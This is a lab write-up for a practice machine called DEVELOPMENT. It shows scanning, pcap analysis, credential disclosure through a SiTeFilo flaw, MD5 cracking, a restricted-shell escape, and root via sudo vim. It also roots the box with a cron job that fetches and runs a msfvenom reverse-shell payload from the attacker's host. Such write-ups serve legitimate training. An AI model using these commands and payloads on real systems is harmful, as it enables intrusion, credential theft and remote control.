**Description:** This is designed for OSCP practice, and the original version of the machine was used for a CTF.

**Author:** Donavan

**Operating System:** Linux

**Aim:** To get root shell.

## Information Gathering
### Host Discovery
Let's start discovering our target with netdiscover, as shown below:

``` bash
root@kali:~$ netdiscover -i vmnet1 -r 192.168.179.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts 

 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 282 
 __________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname  
 --------------------------------------------------------------------------
 192.168.179.130 00:0c:29:9e:13:ea      4     240  VMware, Inc.        
 192.168.179.254 00:50:56:ec:79:b5      1      42  VMware, Inc.       
```

### Port Scanning
Discovered the target is time to enumerate all TCP open ports, for this I used nmap whith the following instruction:

``` bash
root@kali:~$ nmap -n -v -T4 -p- 192.168.179.130 -oG tcp-scan-all-ports.txt
...
PORT     STATE SERVICE
22/tcp   open  ssh
113/tcp  open  ident
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
MAC Address: 00:0C:29:9E:13:EA (VMware)
...
```

### Service Enumeration
With nmap I proceeded to perform an aggressive scan to enumerate services and versions running on open ports.

``` bash
root@kali:~$ nmap -n -v -A -p22,113,139,445,8080 -Pn 192.168.179.130 -oN tcp-service-enumeration.txt
...

### Web Enumeration
We focus on port 8080, browsing the web page we see a message, for view some of the projects visit **html_pages**.

![](/assets/images/development/screenshot-1.png)

We visit that resource and find a list of web file names. 

![](/assets/images/development/screenshot-2.png)

Enumerating these web files, in the downloads.html resource, visiting the page source I found the name of a pcap file, as shown in the following screenshots:

![](/assets/images/development/screenshot-3.png)

![](/assets/images/development/screenshot-4.png)

Then I download the test.pcap file with wget and filter this by http requests with tshark.

``` bash
root@kali:~$ wget 192.168.179.130:8080/test.pcap
root@kali:~$ tshark -r test.pcap -T fields -e http.host -e http.request.uri -Y 'http.request' 2>/dev/null | sort -u | column -t
192.168.254.157:8080  /developmentsecretpage/directortestpagev1.php
192.168.254.160       /qinyi/motivation.html
```
I find a request made to port 8080, I access this URL and we are presented an alert box, the same one that redirects us to the director page, then log out this page.

![](/assets/images/development/screenshot-5.png)

![](/assets/images/development/screenshot-6.png)

We try to log in to this login page with **admin:admin** or any credential.

![](/assets/images/development/screenshot-7.png)

We see the following error, I googled and find that it is a **Simple Tex-File Login script (SiTeFilo)** and is vulnerable to File Disclosure/Remote File Inclusion, the exploit you can find here [https://www.exploit-db.com/exploits/7444](https://www.exploit-db.com/exploits/7444)

![](/assets/images/development/screenshot-8.png)


## Exploitation
### File Disclosure

I Download the exploit to the attacking machine and we review its content.

``` bash
root@kali:~$ wget https://www.exploit-db.com/download/7444
root@kali:~$ less 7444.txt
...
[0x02] Bug:[Remote File Inclusion]

[!] EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]
...
[0x03] Bug:[Sensitive Data Disclosure]
...
In this login system, sensible datas like username and password are stored in a local
text file , so we can get sensitive information just going to this txt file . The name of
this file is set in slogin_lib.inc.php. By default is: slog_users.txt

[!] EXPLOIT: /[path]/slog_users.txt
...
```

I tried exploiting by Remote File Inclusion but for some reason it doesn't work and I opt for Sensitive Data Disclosure wich allows me to read usernames and passwords in the **slog_users.txt** file.

![](/assets/images/development/screenshot-9.png)

I downloaded the **slog_users.txt** file and filtered the password hashes to a file called hashes.txt.

``` bash
root@kali:~$ wget http://192.168.179.130:8080/developmentsecretpage/slog_users.txt
root@kali:~$ cat slog_users.txt 
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
root@kali:~$ awk '{print $2}' slog_users.txt > hashes.txt
```

I developed a python script to crack these md5 hashes.

```python
#!/usr/bin/env python3

import requests,re

def decrypt(hash):
    try:
        r=requests.get(f"https://md5.gromweb.com/?md5={hash}")
        md5_decrypt=re.findall("\sstring\">(.*?)</.*", r.text)
        return md5_decrypt[0]
    except:
        pass

hashes=open("hashes.txt").read().splitlines()

if __name__=="__main__":
    for hash in hashes:
        cracked=decrypt(hash)
        if cracked:
            print(f"{hash}: {cracked}")
```
We execute the script and obtain the passwords.

``` bash
root@kali:~$ ./decrypt.py 
4a8a2b374f463b7aedbb44a066363b81: 12345678900987654321
87e6d56ce79af90dbe07d387d3d0579e: P@ssw0rd25
ee64497098d0926d198f54f6d5431f98: qiu
```
We log in to ssh with the username **intern** and password **12345678900987654321** and we have access to a limited shell, to scape this we execute the instruction as shown below: 

``` bash
root@kali:~$ ssh intern@192.168.179.130 
intern@192.168.179.130's password: 
intern:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo os.system("/bin/bash")
intern@development:~$ 
```

I tried to access via ssh with the **patrick** user but he was not allowed, so from the **intern** user I changed to the **patrick** user with the password **P@ssw0rd25**, listing the sudo permissions for this user I found that he was allowed run nano and vim.

``` bash
intern@development:~$ su patrick
Password: 
patrick@development:/home/intern$ 
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
patrick@development:~$ 
```

## Privilege Escalation
### Sudo Permissions
**Privilege scalation with vim**

To escalate privileges with vim we will abuse its ability to execute commands, as shown below:

``` bash
patrick@development:~$ sudo vim -c ':!/bin/bash'

root@development:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Privilege escalation with nano**

Another way to escalate privileges is to create a cron job in the **cron.d** directory to download a linux payload, give it execute permissions, and run it, as shown below:

``` bash
patrick@development:~$ sudo nano /etc/cron.d/evilcron
```
![](/assets/images/development/screenshot-10.png)

Then we will create a linux payload with the following instruction:

``` bash
root@kali:~$ msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=192.168.179.1 LPORT=443 -f elf -o back.door
```

We set up a nc listener and after a minute the cron job will download and execute the payload giving us a shell, as shown below:

``` bash
root@kali:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.179.130 - - [23/Apr/2021 17:36:01] "GET /back.door HTTP/1.1" 200 -
```

``` bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.130] 36224
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux development 4.15.0-34-generic #37-Ubuntu SMP Mon Aug 27 15:21:48 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
cat /root/proof.txt
Congratulations on rooting DEVELOPMENT! :)
```

Another way to get root on this box is through kernel exploitation which is vulnerable to [CVE-2018-18955](https://nvd.nist.gov/vuln/detail/CVE-2018-18955), you can find the exploit [here](https://www.exploit-db.com/exploits/47165), or also through **lxd** since the user patrick is member of the group lxd.
